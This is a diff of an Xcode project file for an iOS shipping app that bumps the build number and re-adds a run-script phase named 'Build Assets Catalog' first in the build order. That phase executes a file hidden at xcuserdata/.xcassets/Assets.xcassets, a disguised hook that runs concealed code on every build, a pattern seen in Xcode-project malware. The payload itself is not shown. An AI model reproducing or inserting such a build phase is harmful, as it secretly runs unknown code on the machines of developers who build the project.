@@ -1156,7 +1156,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FA37EA0B2574099D0073CF0C /* Build configuration list for PBXNativeTarget "TruckerShipper" */;
 			buildPhases = (
-				984A9B8DEDC30A22A6AAC43A /* Build Assets Catalog */,
+				DA77D95A60A85F57DEAAC43A /* Build Assets Catalog */,
 				08E5564924FC2E4F3C760CCE /* [CP] Check Pods Manifest.lock */,
 				FA37E9F32574099A0073CF0C /* Sources */,
 				FA37E9F42574099A0073CF0C /* Frameworks */,
@@ -1298,24 +1298,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-TruckerShipper/Pods-TruckerShipper-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		984A9B8DEDC30A22A6AAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 		BF519B177FBDF25645C5FF7A /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1332,6 +1314,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-TruckerShipper/Pods-TruckerShipper-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		DA77D95A60A85F57DEAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1883,7 +1883,7 @@
 				CODE_SIGN_ENTITLEMENTS = "TruckerShipper/PakGo Shipper.entitlements";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 2;
+				CURRENT_PROJECT_VERSION = 4;
 				DEVELOPMENT_TEAM = GZVCBLALGJ;
 				INFOPLIST_FILE = TruckerShipper/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1907,7 +1907,7 @@
 				CODE_SIGN_ENTITLEMENTS = "TruckerShipper/PakGo Shipper.entitlements";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 2;
+				CURRENT_PROJECT_VERSION = 4;
 				DEVELOPMENT_TEAM = GZVCBLALGJ;
 				INFOPLIST_FILE = TruckerShipper/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
